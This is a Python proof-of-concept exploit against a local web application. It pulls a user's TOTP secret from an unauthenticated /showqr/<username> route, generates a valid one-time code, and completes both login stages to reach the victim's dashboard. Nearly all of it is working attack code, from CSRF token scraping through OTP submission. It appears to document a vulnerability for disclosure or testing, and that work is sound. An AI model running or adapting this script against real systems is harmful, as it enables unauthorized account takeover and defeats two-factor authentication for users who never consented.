"""
POC 2: TOTP Secret Leak via GET /showqr/<username> -> Full 2FA Login
Target: http://127.0.0.1:5000/showqr/<username>

Vulnerability:
The /showqr/<username> route performs zero authentication or authorization checks.
Any unauthenticated attacker can query the route for any username to receive the raw
base32 TOTP secret and QR code. The attacker then generates valid RFC 6238 TOTP codes
to bypass the 2FA handshake.
"""

import http.cookiejar
import re
import urllib.parse
import urllib.request
import pyotp

BASE_URL = "http://127.0.0.1:5000"

def run_poc(target_username="victim_alice", target_password="PwnedPassword2026!"):
    print(f"[*] Attacking 2FA for user: '{target_username}'")

    # Step 1: Unauthenticated request to /showqr/<target_username>
    req = urllib.request.Request(f"{BASE_URL}/showqr/{target_username}")
    try:
        resp = urllib.request.urlopen(req)
        html = resp.read().decode("utf-8")
        print(f"[+] GET /showqr/{target_username} Status: {resp.status}")
    except urllib.error.HTTPError as e:
        print(f"[-] Exploit failed: GET /showqr/{target_username} blocked with HTTP {e.code} ({e.reason}).")
        return

    # Extract base32 secret
    match = re.search(r'class="font-mono text-zinc-200 text-sm">([A-Z2-7=]+)<', html)
    if not match:
        match = re.search(r'([A-Z2-7]{16,32})', html)
    totp_secret = match.group(1)
    print(f"[!] EXFILTRATED RAW TOTP SECRET: {totp_secret}")

    # Step 2: Generate current valid RFC 6238 OTP token
    totp = pyotp.TOTP(totp_secret)
    valid_otp = totp.now()
    print(f"[+] Generated Active OTP from Exfiltrated Secret: {valid_otp}")

    # Step 3: Perform Stage-1 Authentication
    cj = http.cookiejar.CookieJar()
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def http_error_302(self, req, fp, code, msg, headers):
            return fp

    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NoRedirect())
    login_html = opener.open(f"{BASE_URL}/login").read().decode("utf-8")
    csrf_token = re.search(r'name="csrf_token"\s+value="([^"]+)"', login_html).group(1)

    login_data = urllib.parse.urlencode({
        "csrf_token": csrf_token,
        "username": target_username,
        "password": target_password,
    }).encode("utf-8")
    login_resp = opener.open(urllib.request.Request(
        f"{BASE_URL}/loginsubmit", data=login_data,
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
    ))
    print(f"[+] Stage-1 Login Status: {login_resp.status}, Redirect: {login_resp.headers.get('Location')}")

    # Step 4: Perform Stage-2 TOTP Verification using exfiltrated secret
    otp_html = opener.open(f"{BASE_URL}/verify-otp").read().decode("utf-8")
    csrf_otp = re.search(r'name="csrf_token"\s+value="([^"]+)"', otp_html).group(1)
    otp_data = urllib.parse.urlencode({
        "csrf_token": csrf_otp,
        "otp": valid_otp,
    }).encode("utf-8")
    otp_resp = opener.open(urllib.request.Request(
        f"{BASE_URL}/verify-otp", data=otp_data,
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
    ))
    print(f"[+] Stage-2 OTP Verify Status: {otp_resp.status}, Redirect: {otp_resp.headers.get('Location')}")

    # Step 5: Access Protected User Dashboard
    dash_resp = opener.open(f"{BASE_URL}/dashboard")
    dash_html = dash_resp.read().decode("utf-8")
    pwned = f"Welcome, {target_username}" in dash_html
    print(f"[+] Protected Dashboard Status: {dash_resp.status}, Welcome Message Found: {pwned}")
    if pwned:
        print("[!] FULL 2FA BYPASS & ACCOUNT TAKEOVER COMPLETE!")

if __name__ == "__main__":
    run_poc()
